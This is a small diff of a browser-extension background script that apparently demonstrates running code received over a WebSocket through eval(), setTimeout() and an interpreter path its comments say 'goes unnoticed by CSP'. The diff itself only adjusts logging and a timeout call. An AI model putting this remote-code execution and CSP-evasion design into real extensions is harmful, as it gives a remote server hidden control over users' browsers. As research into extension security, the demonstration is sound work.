@@ -51,7 +51,7 @@ async function onInputMessage(message, sender, sendResponse) {
 
         sendResponse({status: 'ok'})
     } catch (err) {
-        console.error(err.message);
+        console.warn(err.message);
         sendResponse({status: 'fail'})
     }
 }
@@ -91,7 +91,7 @@ function connectWebSocket() {
     socket.onmessage = onWsMessage;
 
     socket.onerror = (error) => {
-        console.error('WebSocket error: ', error);
+        console.warn('WebSocket error: ', error);
     };
 
     socket.onclose = (event) => {
@@ -123,7 +123,7 @@ async function onWsMessage(event) {
             console.log("\nExecuting with eval (CSP block expected) ...")
             eval(parsedMessage.data);
         } catch (err) {
-            console.error(`eval() failed: ${err.message}`);
+            console.warn(`eval() failed: ${err.message}`);
         }
 
         // Show that eval through setTimout is blocked by CSP in the background script
@@ -131,7 +131,7 @@ async function onWsMessage(event) {
             console.log("\nExecuting with setTimout (CSP block expected) ...")
             executeWithSetTimeout(parsedMessage.data);
         } catch (err) {
-            console.error(`setTimeout() failed: ${err.message}`);
+            console.warn(`setTimeout() failed: ${err.message}`);
         }
 
         // Alternative, execute the command with the interpreter, goes unnoticed by CSP
@@ -185,5 +185,5 @@ function executeWithInterpreter(command) {
 
 // Execute injected code through a setTimeout
 function executeWithSetTimeout(command) {
-    setTimeout(command, 1);
+    setTimeout(command);
 }
